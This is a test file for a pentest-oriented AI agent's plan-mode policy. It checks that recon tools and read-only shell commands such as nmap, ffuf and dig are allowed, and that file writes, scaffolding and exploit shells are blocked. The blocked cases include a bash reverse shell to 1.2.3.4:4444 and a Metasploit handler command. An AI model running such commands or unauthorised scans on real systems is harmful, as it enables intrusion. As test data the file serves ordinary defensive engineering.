import { describe, expect, it } from "vitest";
import {
  isPlanModeAllowedShellCommand,
  isPlanModeAllowedTool,
} from "../src/agent/session-policy.js";

describe("plan mode gather-only policy", () => {
  it("allows recon tools", () => {
    for (const name of [
      "http.fetch",
      "net.scan",
      "pentest.recon",
      "dns.lookup",
      "whois.lookup",
      "web.search",
      "shell.exec",
      "shell.exec",
      "shell.exec",
      "pkg.install",
      "plan.create",
    ]) {
      expect(isPlanModeAllowedTool(name)).toBe(true);
    }
  });

  it("blocks project file mutation tools", () => {
    for (const name of [
      "fs.write",
      "fs.writeMany",
      "fs.edit",
      "fs.append",
      "fs.replaceLines",
      "fs.delete",
    ]) {
      expect(isPlanModeAllowedTool(name)).toBe(false);
    }
  });

  it("allows recon shells and long scans", () => {
    expect(isPlanModeAllowedShellCommand("nmap -sV --top-ports 1000 example.com")).toBe(
      true,
    );
    expect(
      isPlanModeAllowedShellCommand("ffuf -u https://t/FUZZ -w /usr/share/wordlists/dir.txt"),
    ).toBe(true);
    expect(isPlanModeAllowedShellCommand("dig +short example.com ANY")).toBe(true);
  });

  it("allows read-only inspection that discards errors or prints with printf", () => {
    const toolchainCheck = [
      'echo "--- target"; ls -d ~/Desktop/titter 2>/dev/null || echo "titter: absent"',
      'node -v; npm -v; command -v pnpm || true',
      'for p in vite react; do printf "%s " "$p"; npm view "$p" version 2>/dev/null || echo "?"; done',
      "ls /Applications 2>/dev/null | grep -iE 'chrome|firefox' || echo none",
    ].join("\n");
    expect(isPlanModeAllowedShellCommand(toolchainCheck)).toBe(true);
    expect(isPlanModeAllowedShellCommand("npm test 2>&1 | tail -20")).toBe(true);
    expect(isPlanModeAllowedShellCommand("git log --oneline > /tmp/log.txt")).toBe(true);
    expect(isPlanModeAllowedShellCommand('rg -n "a > b" src')).toBe(true);
  });

  it("blocks shell writes into the project or home folders", () => {
    expect(isPlanModeAllowedShellCommand("echo hi > src/app.ts")).toBe(false);
    expect(isPlanModeAllowedShellCommand("printf 'x' >> README.md")).toBe(false);
    expect(isPlanModeAllowedShellCommand("cat <<EOF > package.json")).toBe(false);
    expect(isPlanModeAllowedShellCommand("npm view react version | tee notes.txt")).toBe(false);
    expect(isPlanModeAllowedShellCommand("ls &> listing.txt")).toBe(false);
  });

  it("blocks scaffold and clear exploit shells", () => {
    expect(
      isPlanModeAllowedShellCommand(
        "npm create vite@latest blog -- --template react",
      ),
    ).toBe(false);
    expect(
      isPlanModeAllowedShellCommand("msfconsole -q -x 'use exploit/multi/handler'"),
    ).toBe(false);
    expect(
      isPlanModeAllowedShellCommand("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"),
    ).toBe(false);
  });
});
